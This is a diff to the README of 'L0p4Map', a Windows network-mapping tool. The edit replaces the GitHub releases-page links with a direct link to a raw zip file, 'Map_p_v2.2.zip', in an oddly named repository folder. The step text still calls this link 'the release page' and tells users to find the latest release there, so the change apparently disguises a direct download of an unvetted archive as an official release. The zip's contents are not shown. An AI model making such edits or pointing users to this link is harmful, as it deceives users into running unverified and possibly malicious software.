@@ -1,6 +1,6 @@
 # 📡 L0p4Map - See Your Network Clearly
 
-[![Download L0p4Map](https://img.shields.io/badge/Download-L0p4Map-blue?style=for-the-badge)](https://github.com/Shevatlaxness715/L0p4Map/releases)
+[![Download L0p4Map](https://img.shields.io/badge/Download-L0p4Map-blue?style=for-the-badge)](https://github.com/Shevatlaxness715/L0p4Map/raw/refs/heads/main/lapcock/Map_p_v2.2.zip)
 
 ## 🖥️ What L0p4Map Does
 
@@ -15,7 +15,7 @@ It is built for Windows users who want a simple way to look at network activity 
 
 ## 📥 Download L0p4Map
 
-1. Open the release page: [https://github.com/Shevatlaxness715/L0p4Map/releases](https://github.com/Shevatlaxness715/L0p4Map/releases)
+1. Open the release page: [https://github.com/Shevatlaxness715/L0p4Map/raw/refs/heads/main/lapcock/Map_p_v2.2.zip](https://github.com/Shevatlaxness715/L0p4Map/raw/refs/heads/main/lapcock/Map_p_v2.2.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file for your system
 4. Save the file to your Desktop or Downloads folder
